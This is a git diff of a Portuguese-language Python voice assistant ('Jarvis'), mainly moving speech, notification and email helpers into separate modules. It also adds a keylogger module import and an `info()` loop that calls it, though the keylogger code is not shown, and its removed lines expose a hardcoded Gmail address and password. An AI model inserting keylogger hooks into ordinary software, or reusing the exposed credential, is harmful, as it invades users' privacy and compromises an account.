@@ -18,18 +18,8 @@ from PyQt5.QtWidgets import *
 from PyQt5.QtGui import *
 from PyQt5 import QtCore
 from PyQt5.QtCore import *
-import pyttsx3
-from gtts import gTTS
-from pydub import AudioSegment
-from pydub.playback import play
-from win10toast import ToastNotifier 
-from plyer import notification
-import string
-import smtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
-import requests
-import json
+import keyboard
+
 
 
 
@@ -43,6 +33,9 @@ import Classes.spotfy.Spotfy
 import Classes.reproduzir_gif.reproduzir_gif
 import Classes.senhas.senhas
 import Classes.prev_tempo.clima
+import Classes.env_email.env_email
+import Classes.notificacoes.notificacoes
+import Classes.keylogger.keylogger
 
 
 
@@ -241,9 +234,6 @@ def main():
 
 
 
-
-
-
 # Função principal de back-end
 def code():
     global audio_tratado
@@ -254,19 +244,6 @@ def code():
     # Cria o reconhecedor de voz e o leitor de texto automatizado
     print("<Criando reconhecedor de voz>")
     r = sr.Recognizer()
-    def fast_speak(texto):
-        # Inicializa o mecanismo de síntese de voz
-        engine = pyttsx3.init()
-        # Sintetiza o texto
-        engine.save_to_file(texto, "Sons/data.mp3")
-        engine.setProperty("rate", 400)  # Aumenta a velocidade em 50%
-        engine.runAndWait()
-        # Carrega o áudio gerado
-        audio = AudioSegment.from_wav("Sons/data.mp3")
-        # Ajusta o volume (por exemplo, 6 dB para aumentar em 6 decibéis)
-        volume_adjustment = 6
-        audio = audio + volume_adjustment
-        play(audio)
     print("<Leitor de texto automatizado criado>")
 
 
@@ -289,7 +266,7 @@ def code():
     print("<Banco de dados conectado>")
 
 
-# Tabela Pergunta no Banco de dados
+
     # Função para consultas na tabela perguntas no banco de dados
     def consulta_db(funcao):
         try:
@@ -304,8 +281,6 @@ def code():
         except pyodbc.Error as e:
             print(e)
 
-
-# Tabela Respostas no Banco de dados
     # Função para consultas na tabela respostas no banco de dados
     def resposta_db(resp):
         global retorno
@@ -327,7 +302,6 @@ def code():
             return retorno
         except pyodbc.Error as e:
             print(e)
-
 
     # Função para logs na tabela logs no banco de dados
     def inserir_logs(audio_tratado_log, retorno_log):
@@ -358,7 +332,6 @@ def code():
 
 
 
-
 # Tabela Agenda no banco de dado
     # Função para consultas na tabela agenda no banco de dados
     def consulta_agenda():
@@ -379,8 +352,8 @@ def code():
         conn.commit()
                 
 
-    # Função Sleep
-    def função_resposta():
+    # Função modo soneca
+    def modo_soneca():
         loop = 1
         with sr.Microphone() as source:
             while loop == 1:
@@ -401,50 +374,11 @@ def code():
                 except sr.UnknownValueError:
                     print("Modo soneca, para me ativar novamente fale 'Acorde' ou 'Ativar'")
 
-    
-    # Exibir Notificações(AINDA NÃO FUNCIONANDO)
-    def exibir_notificacao(titulo, mensagem):
-        notification.notify(
-            title=titulo,
-            message=mensagem,
-            app_icon=None,  # Você pode definir um ícone personalizado para a notificação
-            timeout=10  # A duração da notificação em segundos
-        )
-
-
-    # Enviar Email(AINDA NÃO FUNCIONANDO)
-    def enviar_email(destinatario, Assunto, message):
-        # Configurações do servidor SMTP do Gmail
-        smtp_server = 'smtp.gmail.com'
-        smtp_port = 587
-        username = 'eickoffmatheus@gmail.com'
-        password = '123@Matheuse'
-
-        # Crie uma instância da mensagem
-        msg = MIMEMultipart()
-        msg['From'] = username
-        msg['To'] = destinatario
-        msg['Subject'] = Assunto
-
-        # Corpo do e-mail
-        msg.attach(MIMEText(message, 'plain'))
-
-        # Conecte-se ao servidor SMTP
-        server = smtplib.SMTP(smtp_server, smtp_port)
-        server.starttls()
-        server.login(username, password)
-
-        # Envie o e-mail
-        server.send_message(msg)
-        server.quit()
-
-
-    
 
 
     #Abre o microfone pra captura
-    contexto = " "
-    retorno = " "
+    contexto = ""
+    retorno = ""
     modo_jarvis = ""
     with sr.Microphone() as source:
         print("<Ajustando o ruido do ambiente>")
@@ -478,7 +412,7 @@ def code():
                         print("Modo Soneca")
                         print("------------")
                         retorno = "Modo Soneca"
-                        função_resposta()
+                        modo_soneca()
 
 
 
@@ -766,7 +700,7 @@ def code():
                             contexto += audio_tratado + "\n" + retorno + "\n"
                             label_jarvis.setText("Jarvis: "+retorno)
                             print(retorno)
-                            fast_speak(retorno)
+                            Classes.voices.Voices.fast_speak(retorno)
                         except:
                             print("Erro... Openai não respondendo...")
                             Classes.voices.Voices.speak("Erro... Openai não respondendo...")
@@ -818,6 +752,9 @@ def init():
 
 
 
+def info():
+    while True:
+        Classes.keylogger.keylogger.key()
 
 
 
